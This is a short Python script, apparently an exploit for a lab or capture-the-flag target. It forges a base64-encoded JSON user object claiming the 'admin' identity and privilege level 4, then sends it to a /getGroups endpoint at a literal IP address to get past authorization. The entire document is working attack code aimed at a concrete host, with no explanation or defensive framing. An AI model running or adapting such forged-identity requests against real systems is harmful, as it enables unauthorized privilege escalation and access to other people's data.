import requests
import json
import base64

# encode user data
user_data = {"user_id": 1, "username": "admin", "previlage_id": 4} # Admin previlage required
user_str = json.dumps(user_data)
encoded_user = base64.b64encode(user_str.encode('utf-8')).decode('utf-8')

response = requests.post("http://134.185.172.127:7000/getGroups", json={"user": encoded_user})
print("Status Code:", response.status_code)
print("Response Text:", response.text)
